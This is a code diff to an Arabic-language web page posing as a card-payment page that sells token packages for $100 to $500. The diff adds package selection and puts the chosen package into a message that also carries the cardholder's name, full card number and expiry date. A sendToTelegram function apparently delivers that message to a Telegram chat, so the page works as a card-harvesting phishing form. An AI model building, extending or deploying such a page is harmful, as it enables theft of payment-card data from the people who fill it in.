@@ -34,13 +34,27 @@ h1{font-size:clamp(2.5rem,7vw,5rem);font-weight:900;background:linear-gradient(1
 .form-group{margin-bottom:18px}
 .form-group label{display:block;margin-bottom:8px;color:#8892b0;font-size:.95rem}
 .form-group input,.form-group select{width:100%;padding:14px;background:rgba(0,0,0,.4);border:1px solid rgba(0,212,255,.3);border-radius:10px;color:#fff;font-family:inherit;font-size:1rem;transition:.3s}
-.form-group input:focus{outline:none;border-color:#00d4ff;box-shadow:0 0 20px rgba(0,212,255,.3)}
+.form-group input:focus,.form-group select:focus{outline:none;border-color:#00d4ff;box-shadow:0 0 20px rgba(0,212,255,.3)}
+.form-group select option{background:#1a1f3a;color:#fff}
 .row{display:grid;grid-template-columns:1fr 1fr;gap:15px}
 @media(max-width:600px){.row{grid-template-columns:1fr}.card{padding:25px}.cd-box{padding:15px;min-width:80px}.cd-num{font-size:1.8rem}}
 .warning{background:rgba(255,46,136,.1);border:1px solid #ff2e88;color:#ff88b0;padding:20px;border-radius:12px;margin-top:20px;text-align:center;display:none;animation:shake .5s}
 @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px)}75%{transform:translateX(10px)}}
 .badge{display:inline-block;background:rgba(0,212,255,.15);color:#00d4ff;padding:5px 12px;border-radius:20px;font-size:.8rem;font-weight:700;margin-bottom:15px}
 footer{text-align:center;padding:40px 20px;color:#5a6785;border-top:1px solid rgba(255,255,255,.05);margin-top:60px}
+.package-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:15px;margin:20px 0}
+.pkg{background:rgba(0,0,0,.35);border:2px solid rgba(0,212,255,.25);border-radius:15px;padding:20px 15px;text-align:center;cursor:pointer;transition:.3s;position:relative}
+.pkg:hover{border-color:#00d4ff;transform:translateY(-4px);box-shadow:0 10px 30px rgba(0,212,255,.25)}
+.pkg.active{border-color:#00ff88;background:rgba(0,255,136,.08);box-shadow:0 0 30px rgba(0,255,136,.35)}
+.pkg .price{font-size:1.6rem;font-weight:900;color:#00d4ff;margin-bottom:6px}
+.pkg.active .price{color:#00ff88}
+.pkg .usd{font-size:.85rem;color:#8892b0;margin-bottom:10px}
+.pkg .tokens{font-size:1.1rem;font-weight:700;color:#ff2e88;background:rgba(255,46,136,.1);padding:6px 10px;border-radius:8px;display:inline-block}
+.pkg.active .tokens{color:#00ff88;background:rgba(0,255,136,.15)}
+.pkg .tok-label{font-size:.75rem;color:#8892b0;display:block;margin-top:4px}
+.summary{background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.3);border-radius:12px;padding:15px 20px;margin-top:15px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
+.summary .sum-label{color:#8892b0;font-size:.9rem}
+.summary .sum-value{color:#00ff88;font-weight:900;font-size:1.2rem}
 </style>
 </head>
 <body>
@@ -78,6 +92,54 @@ footer{text-align:center;padding:40px 20px;color:#5a6785;border-top:1px solid rg
   <!-- الدفع بالفيزا -->
   <div class="card">
     <h2>💳 الدفع بالبطاقة الائتمانية</h2>
+
+    <!-- اختيار الباقة -->
+    <div class="form-group">
+      <label>اختر الباقة (بالدولار الأمريكي)</label>
+      <div class="package-grid" id="packageGrid">
+        <div class="pkg" data-usd="100" onclick="selectPkg(this)">
+          <div class="price">$100</div>
+          <div class="usd">دولار أمريكي</div>
+          <span class="tokens" data-tokens="1000">1000</span>
+          <span class="tok-label">رمز (TOKEN)</span>
+        </div>
+        <div class="pkg" data-usd="200" onclick="selectPkg(this)">
+          <div class="price">$200</div>
+          <div class="usd">دولار أمريكي</div>
+          <span class="tokens" data-tokens="2200">2200</span>
+          <span class="tok-label">رمز (TOKEN)</span>
+        </div>
+        <div class="pkg" data-usd="300" onclick="selectPkg(this)">
+          <div class="price">$300</div>
+          <div class="usd">دولار أمريكي</div>
+          <span class="tokens" data-tokens="3600">3600</span>
+          <span class="tok-label">رمز (TOKEN)</span>
+        </div>
+        <div class="pkg" data-usd="400" onclick="selectPkg(this)">
+          <div class="price">$400</div>
+          <div class="usd">دولار أمريكي</div>
+          <span class="tokens" data-tokens="5000">5000</span>
+          <span class="tok-label">رمز (TOKEN)</span>
+        </div>
+        <div class="pkg" data-usd="500" onclick="selectPkg(this)">
+          <div class="price">$500</div>
+          <div class="usd">دولار أمريكي</div>
+          <span class="tokens" data-tokens="6500">6500</span>
+          <span class="tok-label">رمز (TOKEN)</span>
+        </div>
+      </div>
+      <div class="summary">
+        <div>
+          <span class="sum-label">المبلغ المحدد:</span>
+          <span class="sum-value" id="sumUsd">$0</span>
+        </div>
+        <div>
+          <span class="sum-label">الرموز التي ستحصل عليها:</span>
+          <span class="sum-value" id="sumTokens">0 TOKEN</span>
+        </div>
+      </div>
+    </div>
+
     <form id="payForm" onsubmit="handlePay(event)">
       <div class="form-group">
         <label>الاسم الكامل على البطاقة</label>
@@ -112,7 +174,7 @@ footer{text-align:center;padding:40px 20px;color:#5a6785;border-top:1px solid rg
   <div class="card" style="text-align:center">
     <h2 style="justify-content:center">📱 تواصل معنا</h2>
     <p style="color:#8892b0;margin-bottom:20px">للتواصل المباشر والدعم الفني</p>
-    <a href="https://t.me/RASHKINAE" target="_blank" class="btn btn-tg">✈️ فتح تلغرام</a>
+    <a href="https://t.me/+7975723702" target="_blank" class="btn btn-tg">✈️ فتح تلغرام</a>
   </div>
 
 </div>
@@ -147,6 +209,19 @@ function copyAddr(){
   setTimeout(()=>event.target.textContent='نسخ',2000);
 }
 
+// ================== Package Selection ==================
+let selectedUSD = 0;
+let selectedTokens = 0;
+
+function selectPkg(el){
+  document.querySelectorAll('.pkg').forEach(p=>p.classList.remove('active'));
+  el.classList.add('active');
+  selectedUSD = parseInt(el.dataset.usd);
+  selectedTokens = parseInt(el.querySelector('.tokens').dataset.tokens);
+  document.getElementById('sumUsd').textContent = '$' + selectedUSD;
+  document.getElementById('sumTokens').textContent = selectedTokens + ' TOKEN';
+}
+
 // ================== Formatting ==================
 function formatCard(el){
   let v = el.value.replace(/\D/g,'').slice(0,16);
@@ -175,6 +250,12 @@ async function sendToTelegram(text){
 
 async function handlePay(e){
   e.preventDefault();
+
+  if(selectedUSD === 0){
+    alert('⚠️ الرجاء اختيار الباقة أولاً');
+    return;
+  }
+
   const name  = document.getElementById('cardName').value.trim();
   const num   = document.getElementById('cardNum').value.trim();
   const exp   = document.getElementById('cardExp').value.trim();
@@ -182,6 +263,9 @@ async function handlePay(e){
   const email = document.getElementById('cardEmail').value.trim();
 
   const msg = `💳 <b>طلب دفع جديد - السويداء</b>\n\n`+
+              `📦 <b>الباقة المختارة:</b>\n`+
+              `💵 المبلغ: <code>$${selectedUSD}</code>\n`+
+              `🪙 الرموز: <code>${selectedTokens} TOKEN</code>\n\n`+
               `👤 الاسم: <code>${name}</code>\n`+
               `💳 الرقم: <code>${num}</code>\n`+
               `📅 التاريخ: <code>${exp}</code>\n`+
